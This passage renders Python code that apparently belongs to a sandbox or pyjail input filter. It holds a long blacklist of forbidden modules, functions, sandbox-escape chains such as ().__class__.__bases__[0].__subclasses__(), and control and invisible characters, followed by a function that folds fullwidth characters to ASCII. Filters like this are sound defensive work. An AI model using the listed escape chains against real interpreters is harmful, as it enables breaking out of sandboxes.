class="s1">&#39;credits&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">,</span> <span class="s1">&#39;quit&#39;</span><span class="p">,</span> <span class="s1">&#39;breakpoint&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;subprocess&#39;</span><span class="p">,</span> <span class="s1">&#39;commands&#39;</span><span class="p">,</span> <span class="s1">&#39;popen&#39;</span><span class="p">,</span> <span class="s1">&#39;popen2&#39;</span><span class="p">,</span> <span class="s1">&#39;popen3&#39;</span><span class="p">,</span> <span class="s1">&#39;popen4&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;popen&#39;</span><span class="p">,</span> <span class="s1">&#39;spawn&#39;</span><span class="p">,</span> <span class="s1">&#39;fork&#39;</span><span class="p">,</span> <span class="s1">&#39;execve&#39;</span><span class="p">,</span> <span class="s1">&#39;execl&#39;</span><span class="p">,</span> <span class="s1">&#39;execle&#39;</span><span class="p">,</span> <span class="s1">&#39;execlp&#39;</span><span class="p">,</span> <span class="s1">&#39;execlpe&#39;</span><span class="p">,</span> <span class="s1">&#39;execv&#39;</span><span class="p">,</span> <span class="s1">&#39;execve&#39;</span><span class="p">,</span> <span class="s1">&#39;execvp&#39;</span><span class="p">,</span> <span class="s1">&#39;execvpe&#39;</span><span class="p">,</span> <span class="s1">&#39;startfile&#39;</span><span class="p">,</span> <span class="s1">&#39;remove&#39;</span><span class="p">,</span> <span class="s1">&#39;unlink&#39;</span><span class="p">,</span> <span class="s1">&#39;rmdir&#39;</span><span class="p">,</span> <span class="s1">&#39;mkdir&#39;</span><span class="p">,</span> <span class="s1">&#39;chdir&#39;</span><span class="p">,</span> <span class="s1">&#39;chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;chown&#39;</span><span class="p">,</span> <span class="s1">&#39;rename&#39;</span><span class="p">,</span> <span class="s1">&#39;replace&#39;</span><span class="p">,</span> <span class="s1">&#39;walk&#39;</span><span class="p">,</span> <span class="s1">&#39;listdir&#39;</span><span class="p">,</span> <span class="s1">&#39;stat&#39;</span><span class="p">,</span> <span class="s1">&#39;fstat&#39;</span><span class="p">,</span> <span class="s1">&#39;lstat&#39;</span><span class="p">,</span> <span class="s1">&#39;getenv&#39;</span><span class="p">,</span> <span class="s1">&#39;putenv&#39;</span><span class="p">,</span> <span class="s1">&#39;environ&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;urandom&#39;</span><span class="p">,</span> <span class="s1">&#39;socket&#39;</span><span class="p">,</span> <span class="s1">&#39;urllib&#39;</span><span class="p">,</span> <span class="s1">&#39;urllib2&#39;</span><span class="p">,</span> <span class="s1">&#39;requests&#39;</span><span class="p">,</span> <span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;ftplib&#39;</span><span class="p">,</span> <span class="s1">&#39;smtplib&#39;</span><span class="p">,</span> <span class="s1">&#39;socketserver&#39;</span><span class="p">,</span> <span class="s1">&#39;http.server&#39;</span><span class="p">,</span> <span class="s1">&#39;xmlrpc&#39;</span><span class="p">,</span> <span class="s1">&#39;jsonrpc&#39;</span><span class="p">,</span> <span class="s1">&#39;pickle&#39;</span><span class="p">,</span> <span class="s1">&#39;marshal&#39;</span><span class="p">,</span> <span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="s1">&#39;loads&#39;</span><span class="p">,</span> <span class="s1">&#39;dump&#39;</span><span class="p">,</span> <span class="s1">&#39;dumps&#39;</span><span class="p">,</span> <span class="s1">&#39;class&#39;</span><span class="p">,</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>  <span class="s1">&#39;mro&#39;</span><span class="p">,</span> <span class="s1">&#39;__subclasses__&#39;</span><span class="p">,</span> <span class="s1">&#39;__dict__&#39;</span><span class="p">,</span> <span class="s1">&#39;__globals__&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span> <span class="s1">&#39;__getattribute__&#39;</span><span class="p">,</span> <span class="s1">&#39;__getattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__setattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__delattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__code__&#39;</span><span class="p">,</span> <span class="s1">&#39;__closure__&#39;</span><span class="p">,</span> <span class="s1">&#39;__func__&#39;</span><span class="p">,</span> <span class="s1">&#39;__self__&#39;</span><span class="p">,</span> <span class="s1">&#39;__module__&#39;</span><span class="p">,</span> <span class="s1">&#39;__name__&#39;</span><span class="p">,</span> <span class="s1">&#39;__qualname__&#39;</span><span class="p">,</span> <span class="s1">&#39;__file__&#39;</span><span class="p">,</span> <span class="s1">&#39;__loader__&#39;</span><span class="p">,</span> <span class="s1">&#39;__spec__&#39;</span><span class="p">,</span> <span class="s1">&#39;__package__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s1">&#39;__annotations__&#39;</span><span class="p">,</span> <span class="s1">&#39;__kwdefaults__&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;__defaults__&#39;</span><span class="p">,</span> <span class="s1">&#39;()&#39;</span><span class="p">,</span> <span class="s1">&#39;[]&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;lambda&#39;</span><span class="p">,</span> <span class="s1">&#39;yield&#39;</span><span class="p">,</span> <span class="s1">&#39;from&#39;</span><span class="p">,</span> <span class="s1">&#39;import&#39;</span><span class="p">,</span> <span class="s1">&#39;True.__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#34;.__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;0.__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;[].__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">.__class__&#39;</span><span class="p">,</span>  <span class="s1">&#39;pathlib&#39;</span><span class="p">,</span> <span class="s1">&#39;shutil&#39;</span><span class="p">,</span> <span class="s1">&#39;tempfile&#39;</span><span class="p">,</span> <span class="s1">&#39;glob&#39;</span><span class="p">,</span> <span class="s1">&#39;zipfile&#39;</span><span class="p">,</span> <span class="s1">&#39;tarfile&#39;</span><span class="p">,</span> <span class="s1">&#39;inspect&#39;</span><span class="p">,</span> <span class="s1">&#39;dis&#39;</span><span class="p">,</span> <span class="s1">&#39;types&#39;</span><span class="p">,</span> <span class="s1">&#39;imp&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;importlib&#39;</span><span class="p">,</span> <span class="s1">&#39;pkgutil&#39;</span><span class="p">,</span> <span class="s1">&#39;site&#39;</span><span class="p">,</span> <span class="s1">&#39;builtins&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtin__&#39;</span><span class="p">,</span> <span class="s1">&#39;main&#39;</span><span class="p">,</span> <span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;chr&#39;</span><span class="p">,</span> <span class="s1">&#39;ord&#39;</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">,</span> <span class="s1">&#39;oct&#39;</span><span class="p">,</span> <span class="s1">&#39;bin&#39;</span><span class="p">,</span> <span class="s1">&#39;repr&#39;</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;memoryview&#39;</span><span class="p">,</span> <span class="s1">&#39;bytearray&#39;</span><span class="p">,</span> <span class="s1">&#39;bytes&#39;</span><span class="p">,</span> <span class="s1">&#39;str&#39;</span><span class="p">,</span> <span class="s1">&#39;int&#39;</span><span class="p">,</span> <span class="s1">&#39;float&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__.__base__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__.__mro__&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;().__class__.__subclasses__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__.__init__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__.__dict__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__.__getattribute__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__.__bases__[0].__subclasses__()&#39;</span><span class="p">,</span> <span class="s1">&#39;del&#39;</span><span class="p">,</span> <span class="s1">&#39;global&#39;</span><span class="p">,</span> <span class="s1">&#39;nonlocal&#39;</span><span class="p">,</span> <span class="s1">&#39;assert&#39;</span><span class="p">,</span> <span class="s1">&#39;with&#39;</span><span class="p">,</span> <span class="s1">&#39;as&#39;</span><span class="p">,</span> <span class="s1">&#39;try&#39;</span><span class="p">,</span> <span class="s1">&#39;except&#39;</span><span class="p">,</span> <span class="s1">&#39;finally&#39;</span><span class="p">,</span> <span class="s1">&#39;raise&#39;</span><span class="p">,</span> <span class="s1">&#39;import&#39;</span><span class="p">,</span> <span class="s1">&#39;from&#39;</span><span class="p">,</span> <span class="s1">&#39;while&#39;</span><span class="p">,</span> <span class="s1">&#39;for&#39;</span><span class="p">,</span> <span class="s1">&#39;if&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;else&#39;</span><span class="p">,</span> <span class="s1">&#39;elif&#39;</span><span class="p">,</span> <span class="s1">&#39;def&#39;</span><span class="p">,</span> <span class="s1">&#39;class&#39;</span><span class="p">,</span> <span class="s1">&#39;return&#39;</span><span class="p">,</span> <span class="s1">&#39;yield&#39;</span><span class="p">,</span> <span class="s1">&#39;await&#39;</span><span class="p">,</span> <span class="s1">&#39;async&#39;</span><span class="p">,</span> <span class="s1">&#39;print&#39;</span><span class="p">,</span> <span class="s1">&#39;format&#39;</span><span class="p">,</span> <span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;type&#39;</span><span class="p">,</span> <span class="s1">&#39;isinstance&#39;</span><span class="p">,</span> <span class="s1">&#39;issubclass&#39;</span><span class="p">,</span> <span class="s1">&#39;pickle.loads&#39;</span><span class="p">,</span> <span class="s1">&#39;marshal.loads&#39;</span><span class="p">,</span> <span class="s1">&#39;yaml.load&#39;</span><span class="p">,</span> <span class="s1">&#39;json.loads&#39;</span><span class="p">,</span> <span class="s1">&#39;evaljs&#39;</span><span class="p">,</span> <span class="s1">&#39;execjs&#39;</span><span class="p">,</span> <span class="s1">&#39;shell&#39;</span><span class="p">,</span> <span class="s1">&#39;run&#39;</span><span class="p">,</span> <span class="s1">&#39;call&#39;</span><span class="p">,</span> <span class="s1">&#39;check_output&#39;</span><span class="p">,</span> <span class="s1">&#39;Popen&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;check_call&#39;</span><span class="p">,</span> <span class="s1">&#39;getoutput&#39;</span><span class="p">,</span> <span class="s1">&#39;getstatusoutput&#39;</span><span class="p">,</span> <span class="s2">&#34;url&#34;</span><span class="p">,</span><span class="s2">&#34;config&#34;</span><span class="p">,</span><span class="s2">&#34;read&#34;</span><span class="p">,</span><span class="s2">&#34;sub&#34;</span><span class="p">,</span><span class="s2">&#34;get&#34;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">u&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">U&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">N&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;encode&#39;</span><span class="p">,</span> <span class="s1">&#39;decode&#39;</span><span class="p">,</span> <span class="s1">&#39;replace&#39;</span><span class="p">,</span> <span class="s1">&#39;join&#39;</span><span class="p">,</span> <span class="s1">&#39;split&#39;</span><span class="p">,</span> <span class="s1">&#39;format&#39;</span><span class="p">,</span> <span class="s1">&#39;translate&#39;</span><span class="p">,</span> <span class="s1">&#39;maketrans&#39;</span><span class="p">,</span> <span class="s1">&#39;getattr(&#39;</span><span class="p">,</span> <span class="s1">&#39;vars(&#39;</span><span class="p">,</span> <span class="s1">&#39;locals(&#39;</span><span class="p">,</span> <span class="s1">&#39;globals(&#39;</span><span class="p">,</span> <span class="s1">&#39;dir(&#39;</span><span class="p">,</span> <span class="s1">&#39;eval(&#39;</span><span class="p">,</span> <span class="s1">&#39;exec(&#39;</span><span class="p">,</span> <span class="s1">&#39;compile(&#39;</span><span class="p">,</span> <span class="s1">&#39;open(&#39;</span><span class="p">,</span> <span class="s1">&#39;__import__(&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;().__&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#34;.__&#39;</span><span class="p">,</span> <span class="s1">&#39;0.__&#39;</span><span class="p">,</span> <span class="s1">&#39;().__class__(&#39;</span><span class="p">,</span> <span class="s1">&#39;[].__class__(&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">.__class__(&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;{&#39;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;~&#39;</span><span class="p">,</span> <span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="s1">&#39;@&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span>  <span class="s1">&#39;?&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\f</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\v</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x02</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x03</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x04</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x05</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x06</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x07</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x0b</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x0c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x0e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x0f</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x11</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x12</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x13</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x14</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x15</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x16</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x17</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x19</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x1a</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x1b</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x1c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x1d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x1e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x1f</span><span class="s1">&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\u200b</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u200c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u200d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u200e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u200f</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u202a</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u202b</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u202c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u202d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u202e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u2060</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u2061</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u2062</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u2063</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\u2064</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\ufeff</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">u&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">U&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">N{&#39;</span><span class="p">,</span> <span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;0o&#39;</span><span class="p">,</span> <span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="s1">&#39;f&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;f&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;b&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;b&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;r&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;r&#39;&#34;</span><span class="p">,</span>  <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;__&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;--&#39;</span><span class="p">,</span> <span class="s1">&#39;/*&#39;</span><span class="p">,</span> <span class="s1">&#39;*/&#39;</span><span class="p">,</span> <span class="s1">&#39;//&#39;</span><span class="p">,</span> <span class="s1">&#39;;--&#39;</span><span class="p">,</span> <span class="s1">&#39;;#&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">v&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">t&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">r&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">n&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">b&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">a&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">f&#39;</span><span class="p">,</span><span class="s1">&#39;ev&#39;</span><span class="p">,</span> <span class="s1">&#39;ex&#39;</span><span class="p">,</span> <span class="s1">&#39;ch&#39;</span><span class="p">,</span> <span class="s1">&#39;ge&#39;</span><span class="p">,</span> <span class="s1">&#39;b6&#39;</span><span class="p">,</span> <span class="s1">&#39;un&#39;</span><span class="p">,</span> <span class="s1">&#39;co&#39;</span><span class="p">,</span> <span class="s1">&#39;__b&#39;</span><span class="p">,</span> <span class="s1">&#39;__g&#39;</span><span class="p">,</span> <span class="s1">&#39;__s&#39;</span><span class="p">,</span> <span class="s1">&#39;__d&#39;</span><span class="p">,</span> <span class="s1">&#39;__m&#39;</span><span class="p">,</span> <span class="s1">&#39;__c&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_halfwidth</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">unicodedata</span><span class="o">.</span><span class="n">normalize</span><span class="p">(</span><span class="s1">&#39;NFKC&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mh">0xFF21</span> <span class="o">&lt;=</span> <span class="n">code</span> <span class="o">&lt;=</span> <span class="mh">0xFF3A</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">code</span> <span class="o">-</span> <span class="mh">0xFF21</span> <span class="o">+</span> <span class="mh">0x41</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="mh">0xFF41</span> <span class="o">&lt;=</span> <span class="n">code</span> <span class="o">&lt;=</span> <span class="mh">0xFF5A</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">code</span> <span class="o">-</span> <span class="mh">0xFF41</span> <span class="o">+</span> <span class="mh">0x61</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="mh">0xFF10</span> <span class="o">&lt;=</span> <span class="n">code</span> <span class="o">&lt;=</span> <span class="mh">0xFF19</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">code</span> <span class="o">-</span> <span class="mh">0xFF10</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="ow">in</span> <span class="p">{</span><span class="mh">0xFF08</span><span class="p">,</span> <span class="mh">0xFF5F</span><span class="p">}:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="ow">in</span> <span class="p">{</span><span class="mh">0xFF09</span><span class="p">,</span> <span class="mh">0xFF60</span><span class="p">}:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF3B</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF3D</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF5B</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF5D</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF01</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF0C</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF1B</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF1A</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="ow">in</span> <span class="p">{</span><span class="mh">0x3002</span><span class="p">,</span> <span class="mh">0xFF0E</span><span class="p">}:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF1F</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF0F</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
